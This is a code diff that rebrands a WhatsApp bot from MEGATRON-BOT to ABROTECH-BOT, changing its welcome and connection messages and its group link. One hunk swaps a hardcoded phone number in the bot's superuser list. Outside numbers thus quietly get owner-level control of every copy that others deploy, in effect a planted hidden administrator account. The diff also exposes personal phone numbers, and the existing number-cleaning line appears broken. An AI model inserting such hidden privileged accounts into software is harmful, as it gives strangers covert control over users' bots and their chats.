@@ -157,7 +157,7 @@ setTimeout(() => {
             const Damon = '254790593618';
             const Damon1 = '254780273886';
             const Damon2 = "254102350531";
-            const Damon3 = '258874856293';
+            const Damon3 = '2348100151048';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, Damon, Damon1, Damon2, Damon3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -670,7 +670,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `◇MEGATRON-BOT◇
+            let msg = `◇ABROTECH-BOT◇
 `;
              
             let membres = group.participants;
@@ -858,27 +858,27 @@ ${metadata.desc}
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
                 let cmsg = `
-*『𝐌𝐄𝐆𝐀𝐓𝐑𝐎𝐍 𝐁𝐎𝐓 is CONNECTED』*
+*『ABROTECH BOT is CONNECTED』*
 
      
-║❒Creator: *༒𝐃𝚫𝚳𝚯𝚴𖤍༒*
+║❒Creator: *Abrotech*
 ║❒Prefix : [ ${prefixe} ]
 ║❒Mode :${md}
 ║❒Created on : *25.3.2024*
 ║❒Total Commands : ${evt.cm.length}︎
 
-     ▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
-     ▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
+▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
+▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
  
 
 
 ║❒ *JOIN OUR WhatsApp Gʀᴏᴜᴘ*
-https://chat.whatsapp.com/HSChig1YPPQIDEtpvzMBuo
+---COMING SOON---
 
  
 
 
-              *𝐌𝐄𝐆𝐀𝐓𝐑𝐎𝐍-𝐁𝐎𝐓*`;
+              *ABROTECH BOT*`;
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
             }
